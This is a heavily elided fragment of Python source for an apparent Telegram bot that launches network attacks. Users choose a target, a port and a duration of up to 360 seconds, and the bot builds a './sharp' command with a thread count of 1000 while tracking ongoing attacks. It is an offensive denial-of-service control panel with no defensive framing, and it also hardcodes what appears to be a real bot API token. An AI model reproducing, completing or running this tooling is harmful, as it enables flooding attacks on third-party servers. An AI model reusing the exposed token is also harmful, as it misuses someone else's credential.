...
bot = telebot.TeleBot('7748800545:AAHyUbq3Mrgb4C_0wGm7gU7v7gEZhqBWupc')
    ...
    if state['step'] == 1:
        ...
        try:
            ...
            markup.add(
                ...
                InlineKeyboardButton("360 seconds", callback_data="360")
            )
...
def handle_duration_choice(call):
    ...
    if user_id in user_state:
        ...
        try:
            ...
            if state['time'] > 360:
                bot.reply_to(call.message, "Error: Time interval must be less than 360 seconds.")
            else:
                if user_id in ongoing_attacks:
                ...
                full_command = f"./sharp {state['target']} {state['port']} {state['time']} 1000"
